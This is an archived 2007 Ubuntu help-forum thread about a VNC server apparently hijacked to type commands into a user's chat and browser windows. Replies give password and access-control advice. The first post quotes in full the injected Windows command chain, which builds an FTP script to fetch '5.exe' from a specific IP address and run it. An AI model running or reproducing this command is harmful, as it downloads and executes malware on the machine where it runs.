---
title: "Virus already??"
date: 2007-03-25
forum: General Help
---

### Post by czarr on 2007-03-25
This is my first time using linux. I installed Ubuntu about a week ago and had to reinstall after a couple days. The reason being that my home folder could no longer be located. When i tried to load anything it would tell me that it couldn't be found so i rebooted the computer and then couldn't even login because no home folders could be found. To my dismay i popped my live cd back in and started fresh. Earlier in the day i noticed some random text getting put into my gaim convos calling commands like "echo" ".exe" files and some ip addresses. At this point i think i'd only installed berly, wine, and a vnc server so i didnt' really know what to make of that. Today, around a week later i've just run into the same issue again and i'm afraid for my /home. While i was using firefox the "Find" bar opened up and type in itself "c echo open 82.36.28.21 31814 >> ik &echo user 0x1 0xF >> ik &echo get 5.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &5.exe &exit" while my computer beeped like a mad man. Something similar happend yesterday in a gaim chat but without the beeping. It just started typing it in the box like the invisible man was at my computer and then went ahead and sent the I/M. 

What the hell is going on here??? and whats going to happen if this garbage gets in my console??

---

### Post by Jonne on 2007-03-25
you probably don't have a strong password for your vnc server. Turn it off, or use a secure password.

---

### Post by czarr on 2007-03-25
its an 11 character password. should i use numbers and special chars? i didnt' think people were going to actively try to crack my stupid home box.

---

### Post by Docter on 2007-03-25
There could be many reasons for losing access to your home folder; the permissions need to be just right for instance. I lost my home folder after messing about here is how I recovered:

boot into a shell, bypassing X using the session options on the login page and type:
```

sudo groupadd User
sudo useradd -gm User -G adm,dialout,cdrom,floppy,audio,dip,video,plugdev,admin User
```

Either replace 'User' with a username unique from your original or just use 'User'. This will create a new group then a new user assigned to that group, it will create a home folder for that user and give that user access to certain system resources. See 'man useradd' to enable print and scanning services etc for the user.

Then you need to set a password for that user:

```
sudo passwd User
```

then

```
exit
```

This should return you to the login screen. I don't think a reboot is required just login with your new username and password then you can troubleshoot your original home folder from a graphical environment with net access.

---

### Post by airtonix on 2007-03-26
your stuupid home box as you call it is a great soldier in an amry of zombies.....used to enact denial of service attacks upon other hosts...

why use your computer? so the person(s) who started the whole shebang remains anonymous. simple.

evil-windoze-haxxor-rationale : 
"Who cares if you dont work for the NSA im not hacking into your puter for your 'precious' family photos, my goal here is too shift the blame for my actions to you."

Also when your away from home, take note of the IP address of the connection that your using to access your home VNC server.

then when you get home add the IP to a list of allowed host thatn can access the port that VNC runs on.

your gonna have to do this for every place you remotely access from. and its bad security to go to random places and log into your home server...why? well when you have to backtrack and pin point the assailant knowing where any possible access can likely occur helps narrow it down.

your gonna have to re think your computer security behaviour for no matter what bingdingled piece of security software you get you will always  be the weakest link in the security chain of dependancy.

also get the FireEncryptor plugin for firefox, it will generate strong passwords for you or you can use revelation password manager to do this( it will also help store your account info in encrypted xml).

word type passwords only last ten seconds on a clustered jack-the-ripper farm(and thats only pentium3)

---

### Post by Jonne on 2007-03-26
I still don't get why Ubuntu's remote services (ssh, VNC, etc.) don't default to a '3 strikes and you're out' policy out of the box. You have to go out of your way to hack that in (I'm not even sure if it's possible for VNC).

People scanning for open ssh and vnc servers are already a big problem, and it's bound to get worse.

---

